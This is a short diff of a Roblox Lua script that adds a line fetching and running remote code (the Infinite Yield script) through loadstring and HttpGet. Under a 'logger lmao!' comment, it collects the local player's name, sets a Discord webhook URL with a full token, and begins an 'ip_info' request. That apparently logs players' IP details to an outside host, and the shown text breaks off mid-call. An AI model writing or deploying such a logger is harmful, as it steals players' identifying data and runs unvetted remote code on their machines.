@@ -1,3 +1,7 @@
+-- inf yeild
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+
+-- logger lmao!
 local player_name = game:GetService("Players").LocalPlayer.Name
 local webhook_url = "https://discord.com/api/webhooks/939951846007660555/lPkM7U2jQ7zWDK2Tq3HRdJ_g-eUwKOs6C97Fq--DwxjzmnCAdkoe16bh5mIj72Oh_Kik"
 local ip_info = syn.request({
